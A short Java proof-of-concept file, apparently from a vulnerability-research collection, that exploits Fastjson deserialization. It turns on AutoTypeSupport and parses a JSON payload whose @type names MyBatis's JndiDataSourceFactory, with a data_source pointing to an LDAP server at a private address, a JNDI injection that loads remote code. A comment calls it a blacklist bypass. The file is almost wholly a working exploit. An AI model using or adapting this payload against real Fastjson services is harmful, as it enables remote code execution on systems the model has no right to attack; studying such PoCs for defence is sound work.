package vul;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Bypass {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //需要开启AutoTypeSupport
        String poc = "{\n" +
                "\t\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n" +
                "\t\"properties\":\n" +
                "\t{\n" +
                "\t\t\"data_source\":\"ldap://192.168.126.1:1389/us9a9o\"\n" +
                "\t}\n" +
                "}";
        //单纯是一个黑名单绕过
        JSON.parse(poc);
    }
}
